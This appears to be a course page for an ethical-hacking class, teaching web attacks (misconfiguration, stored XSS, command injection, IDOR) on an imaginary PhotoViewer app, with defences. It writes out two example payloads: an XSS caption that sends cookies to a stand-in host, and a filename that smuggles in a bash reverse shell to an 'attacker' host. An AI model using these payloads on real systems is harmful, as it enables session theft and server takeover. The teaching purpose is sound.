    Week 9 · Web Attacks I — Servers & Apps¶

    🧭 Application · CEH: Gaining Access (web) · abusing the trust an app places in the input you hand it — one running example, PhotoViewer

    We're through the network and off the host. Now the application — the layer your users actually touch, and the single biggest attack surface on the internet. Every attack this week sorts into three doors — code, config, credentials — on one running example: PhotoViewer.

    Why the web is the biggest target

    An internal app — say a payroll site buried in the enterprise network — is hard to reach; you'd have to get inside first. A web app like amazon.com must sit in the DMZ, reachable by anyone on the internet, or it can't take a customer's order. That exposure is the whole point of a web app — and exactly what makes it the most-probed thing an organization owns.

    Last week & before

    The server's layers

    Recon flagged a vulnerable Apache (platform); ShellShock hit the Bash shell (OS). Those are the server's stack.

    This week

    The app's own code

    One level up — the code the organization wrote, the part users interact with. New bugs, new victims.

    The one idea for the week: a static site that only hands out pictures is almost unhackable — the worst you can do is sniff plaintext traffic (a network attack). The moment the app takes input — a login, a search, a caption, a filename — and does something with it, you've created the attack surface. Web hacking is abusing the trust the backend places in that input.

    The machine you're attacking

    PhotoViewer is the classic three tiers: a web server in the DMZ (serves HTML/JS), an app server (the logic), and a data tier (a catalog database — who owns which photo, public or private, and where it's stored — plus the photo store itself). Walk one real request:

    The three doors — and who gets hurt

    Every web attack is one of three mistakes, named by whose mistake it is. Same three doors as last week, now on the web.

    🐛 Code

    The developer's bug

    They wrote exploitable code — input gets treated as code, or a check is missing.

    ⚙️ Config

    The operator's slip

    The code is fine; it was deployed wrong — a setting left too loose.

    🔑 Credentials

    The stolen identity

    No bug at all — the attacker just is a valid user. (The deep version is Week 10.)

    A second question rides along on every attack — who gets hurt. Sometimes the victim is the company (its server, its whole dataset); sometimes it's a single user (their session, their private records). That's a separate axis from the three doors — watch the victim tag in the corner of each attack below. The same app, holding the same data, can be attacked to hurt the company or its users.

    Config Misconfiguration — the code is fine, deployed wrong Victim: the company

    Start here, because it needs no app bug at all — just a setting left in the wrong position. Remember step ④: the JSON Mary gets back carries the URLs to where her photos actually live.

    The headline case

    The photo store left open

    If the store isn't locked down, Mary takes those URLs and queries the storage directly, around the app entirely — pulling photos other users marked private. If directory listing is on, she doesn't even guess URLs; she lists the whole store.Real world — Deep Root Analytics, 2017: an S3 bucket set to public exposed ~198 million US voter records. No exploit — just access left out.

    The rest of the family

    The usual misconfigurations

    • guess photoviewer.com/admin → an admin console on default admin / admin
    • the catalog database reachable with a blank/default password — exactly how thousands of open MongoDB & Elasticsearch servers have leaked
    • verbose errors that spill table and column names
    • an unpatched component with a known CVE

    The common thread: none of these is a coding bug — each is something the operator left open. Always sanitize what comes in from the user, and what goes out (those error messages too).

    Code Cross-site scripting (XSS) — input becomes code Victim: another user

    Now the Code door, and the big idea for the next three attacks: injection — data you type gets treated as code. On PhotoViewer a user can put a caption on a photo. It's supposed to be plain text — but the app never checks it and later writes it straight into the page's HTML.

    caption on Mary's photo: <script>fetch("evil.site/x?c="+document.cookie)</script> → stored as "text", then run in the next viewer's browser
    The move

    A caption that runs

    Mary sets her caption to a <script>. When Bob opens that photo, Bob's browser runs Mary's code, with Bob's session — as if PhotoViewer sent it.

    Why it matters

    The app serves your code

    Same mechanic as the others — data treated as code — but a new victim: not the app, another user. Next week we weaponize this to steal Bob's session.Real world — TweetDeck, 2014: a tweet carrying a script ran inside the TweetDeck client (twitter.com itself stripped it) and self-spread as a worm across feeds.

    🧪 Lab 2 — XSS by hand

    Code OS command injection — code on the server Victim: the app / server

    Same injection idea, a new place it lands. To make a thumbnail, PhotoViewer runs a real OS command and pastes your filename into it. But the filename is yours to choose.

    you upload a file named: vacation.jpg; bash -i >& /dev/tcp/attacker/4444 0>&1 server runs: convert vacation.jpg; bash… -resize 200x200 thumb.jpg the ; ends the resize and starts your command — the shell runs both output isn't shown, so it dials a shell back to you (a reverse shell)
    The trick

    Name the file a command

    A ; and a command after the name. It's blind — the page only shows a thumbnail — so the payload opens a connection back to the attacker rather than printing output.

    Why it matters

    Now you're on the box

    A shell on the web server puts you inside the enterprise network — the start of last week's whole loop.Real world — ImageMagick "ImageTragick", 2016 (CVE-2016-3714): crafted uploads ran commands on any site that processed them — same trick, hidden in the image instead of its name.

    🧪 Lab 2 — command injection by hand

    Code Broken auth & access control (IDOR) Victim: a user

    The last Code flaws need no injection — the app does exactly what it was written to do, just for the wrong person.

    Broken authentication

    A guessable front door

    No limit on login attempts, so an attacker runs thousands of password guesses until one works — worse if Mary reused a password leaked elsewhere. No lockout, weak passwords, no MFA. The attacker becomes one specific user.

    IDOR · broken access control

    Ask for what isn't yours

    Mary opens her photo at ?id=123, then just types 124 — David's private photo. The app checks she's logged in, but never that the photo is hers, and hands it over. Walk the numbers → everyone's data.

    GET /photos?id=124 Cookie: session=mary is this request logged in?  ✓ yes — it's Mary does photo 124 belong to Mary?  ✗ never asked 200 OK → returns David's private photo

    The bug is the missing ownership check. Every object needs its own "who's allowed?" — being logged in isn't the same as being authorized for this object.  Real world — First American, 2019: ~885 million mortgage files exposed by changing the number in a document URL.

    🧪 Lab 2 — broken access control by hand

    The defender's view

    Almost every attack this week traces to one habit: the app trusted input it should have checked. So the defenses cluster, too.

    Code bugs

    Sanitize input, encode output — a caption can't become a script, a filename can't become a command

    Access control

    Check ownership on every object — logged-in ≠ authorized; add MFA and lockouts

    Config

    Lock the store, change defaults, patch — no public buckets, no admin/admin

    Behind it all

    A WAF and web/access-log monitoring catch the payloads a slip lets through

    The three doors are whose mistake; the victim tag is who pays — two questions on every web attack.
